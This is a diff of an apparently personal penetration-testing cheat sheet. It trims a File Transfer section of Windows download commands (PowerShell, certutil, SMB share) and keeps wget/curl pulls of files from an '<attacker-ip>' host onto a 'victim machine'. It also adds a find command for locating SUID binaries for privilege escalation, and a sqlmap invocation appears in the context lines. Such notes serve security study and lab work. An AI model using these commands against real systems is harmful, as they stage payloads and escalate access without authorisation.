@@ -97,41 +97,12 @@ sqlmap -r login.req --level=5 --risk=3 --batch
 ## File Transfer <a name="ft"></a>
 
 ```bash 
-# between *nix os
-
 # on the attacker machine
 python3 -m http.server 8081
 
 # on the victim machine
 wget http://<attacker-ip>:<port>/<file>
 curl http://<attacker-ip>:<port>/<file> -o <output-file>
-
-#===========================================================#
-
-# from linux to windows
-
-# on the attacker machine
-# creates a anonymous login
-sudo smbserver.py <share-name> <linux-path> -smb2support
-
-# on the victim machine
-copy \\<attacker-ip>\<share-name>\<file> <copy-path-in-windows>
-# mount the share in windows
-net use x: \\<attacker-ip>\<share-name> /user:<user-name> <password>
-copy x:\<file> <copy-path-in-windows>
-
-# from external url
-# sometimes fails
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://<attacker-ip>/<file>','<download-path-in-windows>')
-
-# works mostly
-#@alias
-iwr -uri 'http://<attacker-ip>/<file>' -o '<download-path-in-windows>'
-#@cmdlet
-powershell.exe -command Invoke-WebRequest -Uri 'http://<attacker-ip>/<file>' -OutFile '<download-path-in-windows>'
-
-# using certutil
-certutil -urlcache -f 'http://<attacker-ip>/<file>' '<download-path-in-windows>'
 ```
 
 
@@ -164,6 +135,11 @@ Parameters:
 find [path] [expression] 2>/dev/null
 ```
 
+Also,  *find* can be useful to find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
+```bash
+# Use 2>/dev/null if you don't want to see errors output
+find / -perm -u=s -type f 2>/dev/null
+```
 
 ## Directory Traversal <a name='dt'></a>
 
